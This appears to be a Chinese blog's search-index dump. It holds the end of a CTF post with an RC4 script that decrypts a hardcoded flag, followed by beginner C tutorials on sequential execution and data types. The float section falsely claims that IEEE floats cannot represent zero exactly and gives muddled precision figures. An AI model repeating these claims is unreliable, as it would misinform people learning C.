class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>C:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RC4</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交换函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成的256长度的sbox</span></span><br><span class="line"><span class="type">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化s表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        tmp = sbox[i];</span><br><span class="line">        j = (j + tmp + key[k]) % <span class="number">256</span>;</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = tmp;</span><br><span class="line">        <span class="keyword">if</span> (++k &gt;= <span class="built_in">strlen</span>((<span class="type">char</span> *) key))k = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_decode</span><span class="params">(<span class="type">uint8_t</span> *dec, <span class="type">uint8_t</span> *enc, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//len为flag长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        j = (j + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        k = (k + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        swap(sbox + j, sbox + k);</span><br><span class="line">        dec[i] = enc[i] ^ (sbox[((<span class="type">int</span>) sbox[j] + sbox[k]) % <span class="number">256</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//    scanf(&quot;%s&quot;,s3);</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">uint8_t</span> dec[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需要解密的字节串</span></span><br><span class="line">    <span class="type">uint8_t</span> enc[] = &#123;</span><br><span class="line">            <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="number">181</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">225</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">244</span>, <span class="number">147</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">182</span>, <span class="string">&#x27;J&#x27;</span>, <span class="number">250</span>, <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="number">25</span>, <span class="number">135</span>, <span class="number">4</span>, <span class="number">188</span>, <span class="string">&#x27;-&#x27;</span>, <span class="number">230</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">22</span>, <span class="number">220</span>, <span class="number">25</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;55667788&quot;</span>;</span><br><span class="line">    init_sbox((<span class="type">unsigned</span> <span class="type">char</span> *) key);</span><br><span class="line">    len = <span class="keyword">sizeof</span>(enc) / <span class="keyword">sizeof</span>(enc[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        enc[i] -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RC4_decode(dec, enc, len);</span><br><span class="line">    <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, dec[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-5-顺序执行</title>
      <link href="/2023-09-22-22bfbdadd502/"/>
      <url>/2023-09-22-22bfbdadd502/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是顺序执行">什么是顺序执行</h1><p>顺序执行很简单,就是一步一步的向下运行,不管你写了什么代码,永远都是从开始的地方自上而下一步一步的执行到结束,除非中途有执行顺序改变的代码(选择语句,循环语句,goto跳转等)</p><p>任何语言都有这3种执行顺序的支持(不同程度上),C语言也不例外,而对于顺序执行,没有任何特殊的辅助标识来提示,单纯的<code>向下</code>依次运行即可(显然,正常人都不会认为程序默认会从下向上执行).</p><p>例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第一条语句\n&quot;</span>); <span class="comment">// printf用来输出一个字符串,这里只需要知道用来输出即可</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第二条语句\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第三条语句\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第四条语句\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果很显而易见:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922191707205.png" alt="image-20230922191707205" style="zoom:33%;" /><p>另一个算数的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num); <span class="comment">//同样,只需要知道是用来输出num的值即可</span></span><br><span class="line">num = num + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">num = num + <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">num = num + <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922192123052.png" alt="image-20230922192123052" style="zoom:33%;" /><p>实际上顺序执行几乎完全不需要考虑任何问题,你只需要按照你的想法去考虑这个程序一步步地要依次做什么事情,然后去一行行的写代码即可.</p><p>​—WAHAHA,2023.9.22</p><br><br><p>上一篇:<a href="../2023-09-23-7bb78790d38b/">c语言教程-4-表达式和语句</a></p><p>下一篇:<a href="../2023-09-24-7a3f77e5bcf7/">c语言教程-6-选择执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-3_1-数据类型</title>
      <link href="/2023-09-20-949602bbfb8e/"/>
      <url>/2023-09-20-949602bbfb8e/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要有数据类型">为什么要有数据类型</h1><p>​如果你能想到这个问题,那么恭喜你意识到了低级语言和高级语言的区别.机器语言自然不必多说,到了汇编语言,仍然没有发展出数据类型这个概念–一切都是按照二进制串逐字节进行处理的.也就是说,在汇编语言的角度,无论这个数据是什么(无论是小数,整数,还是字符串),统统视为二进制串,程序员需要自己去识别考虑自己现在正在处理什么数据,去编写对应的处理代码.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">; 8086汇编</span><br><span class="line">; 定义两个数据段,我们只能将其视为一个个的字节(或字)去进行处理,没有其他的类型可以识别,</span><br><span class="line">; 各个数据段的意义及操作全凭程序员自己处理</span><br><span class="line">assume cs:code</span><br><span class="line">data1 segment</span><br><span class="line">    db 1,2,3,4,5           </span><br><span class="line">data1 ends</span><br><span class="line">data2 segment</span><br><span class="line">    db 6,7,8,9,10</span><br><span class="line">data2 ends</span><br></pre></td></tr></table></figure><p>​很容易就能想到这样的开发方式的困难与繁琐.那么随后出现的高级语言,不仅在语法上接近自然语言,在对数据存储的角度,也考虑的十分周到,C语言中出现了(并不是第一个)基本数据类型,用以识别不同类型的数据,从而在底层进行不同的处理—例如浮点数和整数的底层存储原理完全不同,但是它们都共享同一个加法运算符<code>+</code>进行加法运算.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 整数和浮点数都直接使用+运算符</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> integerNum = <span class="number">5</span>,integerNum2 = <span class="number">6</span>;</span><br><span class="line">    <span class="type">float</span> floatNum = <span class="number">2.5</span>,floatNum2 = <span class="number">3.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i_result = integerNum + integerNum2;</span><br><span class="line"><span class="type">float</span> f_result =  floatNum + floatNum2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整数和:%d\n&quot;</span>, i_result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数和:%f\n&quot;</span>, f_result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​也就是说,数据类型方便了我们在编程的时候进行不同数据的区分,而且编译器也能根据数据类型的不同从而进行一定程度的代码检查,从而避免错误的数据处理—然而这种检查是有限的,因为C语言相对还是比较宽松的,一些隐式转换(后面介绍,例如将int类型的值自动提升为float单精度浮点型)C语言是默认允许的.</p><p>​C语言给了C开发者最大限度的自由度,C语言认为避免这些潜在的错误是程序员的事情,而不是为了安全进行限制.越学到后面,尤其是学习了其他高级语言,就越能体会到C语言那极高的自由度,同时,这也给C程序带来了不小的安全问题,例如安全竞赛的PWN方向的很多部分的关键都是利用了C函数的栈溢出漏洞进行攻击.所以,在编写C程序的时候,更应该比其他语言编写者加倍小心,因为C编译器可能并不会给你足够多的报错信息让你进行纠正—同样,越是学的多,越能体会得到这个问题.</p><h1 id="c语言支持的数据类型">C语言支持的数据类型</h1><p>C语言支持的数据类型有如下几种:</p><p>​<code>4种数据类型----整型(整数),浮点型(小数),字符型(字符),特殊(数组,结构体,指针,枚举,联合)</code></p><p>不同的数据类型用来存储不同类型的值,并且彼此之间可以进行一定程度上的转换.</p><h2 id="整型">整型</h2><p>作为数据类型,都有不同的存储范围</p><p>​我们知道有1字节=8位(二进制位)</p><p>​整型的各种数据范围都是2的幂次方,根据编写的程序所要处理的问题规模的不同,我们可以选择合适的类型.</p><p>那么对于整型的所有可选的类型有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">short</span> 短整型 <span class="number">2</span>字节/<span class="number">16</span>位 <span class="number">-2</span>^<span class="number">15</span>~<span class="number">2</span>^<span class="number">15</span><span class="number">-1</span></span><br><span class="line"><span class="type">signed</span> <span class="type">int</span> 整型 <span class="number">4</span>字节/<span class="number">32</span>位 <span class="number">-2</span>^<span class="number">31</span>~<span class="number">2</span>^<span class="number">31</span><span class="number">-1</span> </span><br><span class="line"><span class="type">signed</span> <span class="type">long</span> 长整型 <span class="number">4</span>字节/<span class="number">32</span>位</span><br><span class="line"><span class="type">signed</span> <span class="type">long</span> <span class="type">long</span> 超长整型 <span class="number">8</span>字节/<span class="number">64</span>位</span><br></pre></td></tr></table></figure><p>上面的所有的类型前面都有一个signed关键字,代表这个类型是有符号的(正负号),这个关键字是默认的,也就是说可以忽略,默认创建的变量都是有符号的.</p><p>那么同理,对应就有一系列无符号类型(只要把signed替换为unsigned),例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> 无符号超长整型 <span class="number">8</span>字节 大小比<span class="type">long</span> <span class="type">long</span> 翻了一倍</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>;(如果程序只需要考虑正数)</span><br></pre></td></tr></table></figure><p>接下来讨论的<strong>数据范围</strong>的事情就要涉及到一点底层的知识了(其实没多少,需要自己去看补码的知识—见<code>CSAPP(《深入理解计算机系统》)</code>):</p><p>我们知道对于同样的一字节有:</p><p><strong>只表示正数</strong></p><p>1字节—8个bit位—最多能唯一表示0~255(正数)这些数<br>00000000 原码<br>0/1 两种状态的全部组合有 2^8=256种状态</p><p><strong>同时表示正负数</strong></p><p>首先来看一个问题:</p><p>​我们有1字节,想要最大限度的存储整数—带一个符号signed位+剩下7位有效数字,那么对于0这个数有:</p><p>​0 0000000 +0</p><p>​1 0000000 -0</p><p>​可以发现,如果我们仅仅简单的将各个数的二进制表示来存储的话,那么就会遇到这个问题,即00000000和10000000这两个编码都表示0,且一个是+0,一个是-0,显然从数学上是完全相等的,但是问题就在于,在计算机中,一个数的编码必须是唯一的,那么我们必须要解决这个正负零的问题,解决的方法就是将10000000解释为其他数,我们引入补码这种表示方法,将10000000解释为-128:</p><p>​0 0000000 +0<br>​1 0000000 -128 计算机补码</p><p>我们将256中状态分成几部分:<br>256=128(负数)+127(正数)+1(原点0)<br>也就是说我们实际上能够存储的整数范围就是-128~127</p><p>其实就是 128=2^7—8位数实际上只有7位用来存储真正的数</p><p>同理16位—15位有数<br>0 0000000 00000000 -2^15~2^15-1</p><p>那么可以推出对于k位有符号数,其存储范围是-2^(k-1)~2^(k-1)-1</p><p><code>注:这里只讨论了数据范围,暂时没有讨论补码的问题,感兴趣可以去看CSAPP中的相关章节,或者觉得看不懂百度也行,具体(预计)会在位运算进行讨论</code></p><h2 id="浮点数">浮点数</h2><p>无法精确存储!!!无法精确存储!!!无法精确存储!!!重要的事情说3遍!!!</p><p>浮点数的存储比整数要复杂的多,这并不是C语言的特性,而是计算机对浮点数的存储方式与整数完全不同.现在的浮点数存储已经标准化,都遵循IEEE的标准(具体内容可以自行查询).</p><p>那么由于浮点数存储方式的特殊性(基于科学计数法),导致其虽然总体范围较大,但是却无法精确表示.</p><p><strong>重要的关键点</strong>:C语言中的浮点数(或者说IEEE标准的浮点数)无法精确表示0,无法精确表示无限小数,但可以表示无穷大和NaN(not a number)</p><p>C语言的浮点数主要有两种:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> 双精度浮点型 <span class="number">8</span>字节/<span class="number">64</span>位 精度<span class="number">16</span> 最多小数点后<span class="number">6</span>位</span><br><span class="line"><span class="type">float</span> 单精度浮点型 <span class="number">4</span>字节/<span class="number">32</span>位 精度<span class="number">8</span> 最多小数点后<span class="number">6</span>位</span><br></pre></td></tr></table></figure><p>还有一种用的很少的<code>long double</code>,在现在的机器中精度更高,但是过去是用于解决兼容性问题引入的</p><p>讨论到浮点数,这里举一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> num2 = <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span>; <span class="comment">// num2是一个double类型的变量,并将三个0.1相加的值赋值给它</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.17f&quot;</span>,num2); <span class="comment">// 输出num2的值,并保留17位小数</span></span><br><span class="line"><span class="comment">// 输出 0.30000000000000004</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出实际上浮点数是无法精确存储的,但是越接近0,分布越密集,也就越精确</p><p>ps:笔者对浮点数的了解也比较有限,正在学习中,目前还没有特别深刻的认识(学习漏洞之一,但是实际编程确实会认真考虑到相关问题)</p><h2 id="字符型">字符型</h2><p>字符只有2种:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">signed</span>)<span class="type">char</span> 注意:极个别编译器默认为<span class="type">unsigned</span> <span class="type">char</span> 字符类型 <span class="number">1</span>字节 实际上就类似是一个<span class="number">1</span>字节的<span class="type">int</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span></span><br></pre></td></tr></table></figure><p>字符实际上存的是字符的ASCII码值(正整数)— -128~127<br>-128------------0-------------127(环—溢出问题)<br>char可以用于算术运算—因为实际上就是个数字</p><h3 id="ascii码">ASCII码</h3><p>机器只认识二进制数据,并不认识一个个给我们看的字符,这意味着我们需要把各种字符对应地转换为一个数字.</p><p><code>ASCII码</code>就是最常用的,针对拉丁字符(英文字符)的编码,一共有128个,即2^7个二进制位就能完全表示.</p><p>char变量存储一个字符,也就是存储其对应的ASCII码,由于一个char变量占用1个字节,有8个二进制位,所以足以存储一个码值,同时需要注意的是,由于2^8=256,所以最高位不会被使用,这意味着我们可能将其正常用于符号位.</p><p>事实上,一般情况下,<code>char</code>类型实际上等价于<code>signed char</code>类型.</p><p>ASCII码表请百度查找.</p><h3 id="如何存储一个字符">如何存储一个字符</h3><p>char实际上存储的是字符的ASCII码,这也是他可以参与整数运算的原因.</p><p>但是,我们仍然可以直观地将一个字符赋值给char变量.</p><p>C语言中,单个的字符需要用一对<code>''</code>来包括起来,他们是一个整体,例如字符A在C语言中表示为<code>'A'</code>.</p><p>也就是说,我们简单地将字符加上一对<code>''</code>即可将其赋值给一个char变量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 也就是说,我们简单地将字符加上一对`&#x27;&#x27;`即可将其赋值给一个char变量:</span></span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;a&#x27;</span>;<span class="comment">// c中存储的是字符&#x27;a&#x27;的ASCII码,即97(十进制)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, c); <span class="comment">// 输出 a ,并没有输出97和字符两边的单引号</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中,printf中使用<code>%c</code>来输出一个字符,如果我们仍然使用<code>%d</code>,即输出整数的方式来输出一个字符,那么会输出其ASCII码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;a&#x27;</span>;<span class="comment">// c中存储的是字符&#x27;a&#x27;的ASCII码,即97(十进制)</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, c); <span class="comment">// 输出 97</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么反过来,我们当然可以将一个0~127的整数作为ASCII码赋值给char变量,甚至将一个整数在printf中以<code>%c</code>来解释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">97</span>; <span class="comment">// 97 是 a 的 ASCII 码</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, i); <span class="comment">// 输出 a</span></span><br><span class="line">    <span class="comment">// 98是字符 b 的 ASCII 码,我们直接将其按%c---即字符---输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, <span class="number">98</span>); <span class="comment">// 输出字符 b</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用转义字符来处理特殊字符">使用转义字符来处理特殊字符</h3><p>但不是所有的字符都能直接放在单引号内,例如单引号本身:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 但不是所有的字符都能直接放在单引号内,例如单引号本身:</span></span><br><span class="line">    <span class="comment">// char c = &#x27;&#x27;&#x27;; // 错误</span></span><br><span class="line">    <span class="comment">// 正确的做法是使用转义字符:</span></span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;\&#x27;&#x27;</span>; <span class="comment">// 正确</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, c); <span class="comment">// 输出单引号这个字符 &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这些字符,我们需要使用转义字符来表示,即将其转义为一般的字符,而不是作为C语言语法的一部分.</p><p>要想使用一个转义字符,只需要简单地在想表示的字符前加一个反斜杠<code>\</code>即可,例如上面的单引号就可以这样表示:</p><p><code>'\''</code>,这是一个整体,仅仅表示一个单引号</p><p>同时,由于反斜杠用于转义,所以它本身也是一个特殊字符,同样,我们在其前面加上一个<code>\</code>来转义它:</p><p><code>'\\'</code>,同样,这是一个整体,仅仅表示一个反斜杠</p><p>有关转义字符还有很多,例如字符串使用一对<code>&quot;&quot;</code>来包括,这时候字符串内部出现的<code>&quot;</code>自然也需要转义.</p><p>另一方面,有一些不可见字符,即空白字符,也需要转义,例如<code>'\n'</code>代表一个换行,<code>'\t'</code>代表一个制表符(通常等价于4个空格).</p><p>我们甚至可以将数字放到字符中,尽管单个的字符我们可以直接用一个数值来表示,但是如果是字符串,这将非常重要!</p><p>转义字符如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231007011552875.png" alt="image-20231007011552875" style="zoom:45%;" /></p><h3 id="字符常量">字符常量</h3><p>同时还有一个很多书不会提到,或者说讲的不明确的问题,那就是字符常量到底和int一不一样,这里举一个代码例子,要用到sizeof运算符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 